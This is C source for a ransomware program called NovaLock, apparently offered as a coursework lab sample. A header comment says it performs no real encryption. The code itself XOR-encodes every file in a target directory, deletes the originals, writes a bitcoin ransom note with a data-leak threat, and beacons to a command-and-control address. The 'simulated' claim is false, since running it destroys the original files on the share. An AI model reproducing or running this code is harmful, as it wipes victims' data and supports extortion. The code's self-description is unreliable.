/* SIMULATED ransomware for coursework lab - performs NO real encryption of host data */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
static const char *NOTE =
"=== NOVALOCK ===\nYour files on this network have been encrypted with AES-256 + RSA-2048.\n"
"Your confidential data was also downloaded to our servers.\n"
"To restore files send 0.85 BTC to bc1qnv7l0ck9x2t4h5m8r3e6w0q1z7y4u2p9s5d3f\n"
"Contact: novalock_support@onionmail.example | Victim ID: TN-7F3A91C2\n"
"Do NOT rename files or contact police or data will be published.\n";
static const char *C2 = "cdn-update-sync.net";
static const char *KEY = "NLK_SESSION_KEY=9f2c1ab47e8d03c6b5a9e1f07d24c8b3";
int main(int argc,char**argv){
  const char *dir = argc>1?argv[1]:"/srv/samba/shared";
  DIR *d=opendir(dir); struct dirent *e; char p[512],q[600];
  while(d && (e=readdir(d))){ if(e->d_name[0]=='.')continue;
    if(strstr(e->d_name,".novalock"))continue;
    snprintf(p,sizeof p,"%s/%s",dir,e->d_name); snprintf(q,sizeof q,"%s.novalock",p);
    int in=open(p,O_RDONLY); if(in<0)continue; int out=open(q,O_WRONLY|O_CREAT|O_TRUNC,0644);
    unsigned char b[4096]; ssize_t n; while((n=read(in,b,sizeof b))>0){for(ssize_t i=0;i<n;i++)b[i]^=0x5A; write(out,b,n);} 
    close(in); close(out); unlink(p);} if(d)closedir(d);
  snprintf(p,sizeof p,"%s/README_RESTORE_FILES.txt",dir); FILE*f=fopen(p,"w"); if(f){fputs(NOTE,f);fclose(f);}
  int fd=open(dir,O_RDONLY); (void)fd;
  int s=socket(AF_INET,SOCK_STREAM,0); struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(443);
  inet_pton(AF_INET,"203.0.113.66",&a.sin_addr);
  if(connect(s,(struct sockaddr*)&a,sizeof a)==0){ char m[256]; snprintf(m,sizeof m,"POST /gate.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: NovaLock/2.1\r\n\r\nid=TN-7F3A91C2&host=FS01&st=done\r\n",C2); write(s,m,strlen(m)); }
  volatile const char *k=KEY; (void)k;
  for(;;) sleep(60);
}
